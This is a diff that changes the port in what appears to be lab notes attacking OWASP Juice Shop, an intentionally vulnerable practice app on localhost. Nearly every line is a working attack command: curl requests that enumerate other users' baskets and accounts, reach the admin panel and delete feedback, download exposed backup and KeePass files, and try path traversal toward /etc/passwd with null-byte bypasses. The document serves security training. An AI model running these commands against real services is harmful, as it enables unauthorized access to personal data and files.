@@ -9,14 +9,14 @@
 TOKEN="your-jwt-token-here"
 
 # Your basket (assume ID 1)
-curl http://localhost:3000/rest/basket/1 \
+curl http://localhost:8000/rest/basket/1 \
   -H "Authorization: Bearer $TOKEN"
 
 # Access other users' baskets by changing ID
-curl http://localhost:3000/rest/basket/2 \
+curl http://localhost:8000/rest/basket/2 \
   -H "Authorization: Bearer $TOKEN"
 
-curl http://localhost:3000/rest/basket/3 \
+curl http://localhost:8000/rest/basket/3 \
   -H "Authorization: Bearer $TOKEN"
 ```
 
@@ -24,17 +24,17 @@ curl http://localhost:3000/rest/basket/3 \
 
 ```bash
 # Get user 1's details
-curl http://localhost:3000/api/Users/1 \
+curl http://localhost:8000/api/Users/1 \
   -H "Authorization: Bearer $TOKEN"
 
 # Get user 2's details
-curl http://localhost:3000/api/Users/2 \
+curl http://localhost:8000/api/Users/2 \
   -H "Authorization: Bearer $TOKEN"
 
 # Enumerate all users
 for i in {1..20}; do
   echo "User $i:"
-  curl -s http://localhost:3000/api/Users/$i \
+  curl -s http://localhost:8000/api/Users/$i \
     -H "Authorization: Bearer $TOKEN" | jq '.data.email'
 done
 ```
@@ -43,15 +43,15 @@ done
 
 ```bash
 # Orders
-curl http://localhost:3000/rest/track-order/1
-curl http://localhost:3000/rest/track-order/2
+curl http://localhost:8000/rest/track-order/1
+curl http://localhost:8000/rest/track-order/2
 
 # Feedback
-curl http://localhost:3000/api/Feedbacks/1
-curl http://localhost:3000/api/Feedbacks/2
+curl http://localhost:8000/api/Feedbacks/1
+curl http://localhost:8000/api/Feedbacks/2
 
 # Complaints
-curl http://localhost:3000/api/Complaints/1
+curl http://localhost:8000/api/Complaints/1
 ```
 
 ---
@@ -60,7 +60,7 @@ curl http://localhost:3000/api/Complaints/1
 
 ### Accessing Admin Panel:
 
-**URL:** `http://localhost:3000/#/administration`
+**URL:** `http://localhost:8000/#/administration`
 
 ### Steps:
 1. Log in as any user
@@ -71,7 +71,7 @@ curl http://localhost:3000/api/Complaints/1
 
 ```bash
 # Check JavaScript for routes
-curl -s http://localhost:3000/main.js | grep -oE 'path:\s*"[^"]*"' | sort -u
+curl -s http://localhost:8000/main.js | grep -oE 'path:\s*"[^"]*"' | sort -u
 
 # Found routes:
 # - /#/administration
@@ -84,15 +84,15 @@ curl -s http://localhost:3000/main.js | grep -oE 'path:\s*"[^"]*"' | sort -u
 
 ```bash
 # View all feedbacks (admin)
-curl http://localhost:3000/api/Feedbacks \
+curl http://localhost:8000/api/Feedbacks \
   -H "Authorization: Bearer $TOKEN"
 
 # Delete feedback
-curl -X DELETE http://localhost:3000/api/Feedbacks/1 \
+curl -X DELETE http://localhost:8000/api/Feedbacks/1 \
   -H "Authorization: Bearer $TOKEN"
 
 # View all users
-curl http://localhost:3000/api/Users \
+curl http://localhost:8000/api/Users \
   -H "Authorization: Bearer $TOKEN"
 ```
 
@@ -104,31 +104,31 @@ curl http://localhost:3000/api/Users \
 
 ```bash
 # List FTP contents
-curl http://localhost:3000/ftp
+curl http://localhost:8000/ftp
 
 # Download files
-curl -O http://localhost:3000/ftp/acquisitions.md
-curl -O http://localhost:3000/ftp/coupons_2013.md.bak
-curl -O http://localhost:3000/ftp/eastere.gg
-curl -O http://localhost:3000/ftp/encrypt.pyc
-curl -O http://localhost:3000/ftp/incident-support.kdbx
-curl -O http://localhost:3000/ftp/legal.md
-curl -O http://localhost:3000/ftp/package.json.bak
-curl -O http://localhost:3000/ftp/quarantine.zip
-curl -O http://localhost:3000/ftp/suspicious_errors.yml
+curl -O http://localhost:8000/ftp/acquisitions.md
+curl -O http://localhost:8000/ftp/coupons_2013.md.bak
+curl -O http://localhost:8000/ftp/eastere.gg
+curl -O http://localhost:8000/ftp/encrypt.pyc
+curl -O http://localhost:8000/ftp/incident-support.kdbx
+curl -O http://localhost:8000/ftp/legal.md
+curl -O http://localhost:8000/ftp/package.json.bak
+curl -O http://localhost:8000/ftp/quarantine.zip
+curl -O http://localhost:8000/ftp/suspicious_errors.yml
 ```
 
 ### Path Traversal Attack:
 
 **Null Byte Injection (if applicable):**
 ```bash
-curl "http://localhost:3000/ftp/../../etc/passwd%2500.md"
-curl "http://localhost:3000/ftp/..%2f..%2fetc%2fpasswd%2500.md"
+curl "http://localhost:8000/ftp/../../etc/passwd%2500.md"
+curl "http://localhost:8000/ftp/..%2f..%2fetc%2fpasswd%2500.md"
 ```
 
 **Poison Null Byte:**
 ```bash
-curl "http://localhost:3000/ftp/coupons_2013.md.bak%00.md"
+curl "http://localhost:8000/ftp/coupons_2013.md.bak%00.md"
 ```
 
 ### Files Found:
@@ -145,10 +145,10 @@ curl "http://localhost:3000/ftp/coupons_2013.md.bak%00.md"
 
 ```bash
 # Using path traversal to access files outside /ftp
-curl "http://localhost:3000/ftp/legal.md%250A.md"
+curl "http://localhost:8000/ftp/legal.md%250A.md"
 
 # Null byte bypass
-curl "http://localhost:3000/ftp/package.json.bak%2500.md"
+curl "http://localhost:8000/ftp/package.json.bak%2500.md"
 ```
 
 ---
@@ -161,7 +161,7 @@ curl "http://localhost:3000/ftp/package.json.bak%2500.md"
 
 import requests
 
-BASE_URL = "http://localhost:3000"
+BASE_URL = "http://localhost:8000"
 TOKEN = "your-jwt-token-here"
 HEADERS = {"Authorization": f"Bearer {TOKEN}"}
 
@@ -191,10 +191,10 @@ for endpoint in endpoints:
 
 ```bash
 # If GET is blocked, try other methods
-curl -X GET http://localhost:3000/api/Users/1 # Blocked?
-curl -X POST http://localhost:3000/api/Users/1 # Allowed?
-curl -X PUT http://localhost:3000/api/Users/1 # Allowed?
-curl -X OPTIONS http://localhost:3000/api/Users/1 # Check allowed methods
+curl -X GET http://localhost:8000/api/Users/1 # Blocked?
+curl -X POST http://localhost:8000/api/Users/1 # Allowed?
+curl -X PUT http://localhost:8000/api/Users/1 # Allowed?
+curl -X OPTIONS http://localhost:8000/api/Users/1 # Check allowed methods
 ```
 
 ---
